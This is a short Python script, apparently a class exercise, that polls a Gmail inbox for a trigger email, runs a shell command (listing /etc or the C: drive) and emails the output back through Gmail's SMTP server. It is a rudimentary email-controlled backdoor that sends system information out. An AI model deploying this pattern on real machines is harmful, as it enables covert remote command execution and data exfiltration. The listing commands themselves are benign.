import imaplib
import platform
import os
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def verificarEmail():
    mail = imaplib.IMAP4_SSL('imap.gmail.com')
    mail.login(' ', ' ')
    mail.list()
    mail.select("inbox")
    execucao = mail.uid('search', None, '(HEADER Subject "Execute comando aula")')
    if execucao[1] == [b'']:
        return False
    else:
        return True


def enviarEmail(string):
    sender_email = " "
    receiver_email = " "
    password = "SenhaGmail_5@"

    message = MIMEMultipart("alternative")
    message["Subject"] = "Resultado da execução"
    message["From"] = sender_email
    message["To"] = receiver_email

    # Create the plain-text and HTML version of your message
    text = """\
    Olá,
    O resultado é
     %s""" % string
    html = """\
    <html>
      <body>
        <p>Olá,<br>
           O resultado é <br> %s<br>
        </p>
      </body>
    </html>
    """ % string

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(
            sender_email, receiver_email, message.as_string()
        )


if verificarEmail():
    if platform.system() == "Linux":
        resultado = os.popen("ls /etc")
        string = ""
        for elemento in resultado:
            string += elemento
        enviarEmail(string)
    if platform.system() == "Windows":
        resultado = os.popen("dir c:").readlines()
        string = ""
        for elemento in resultado:
            string += elemento
        enviarEmail(string)
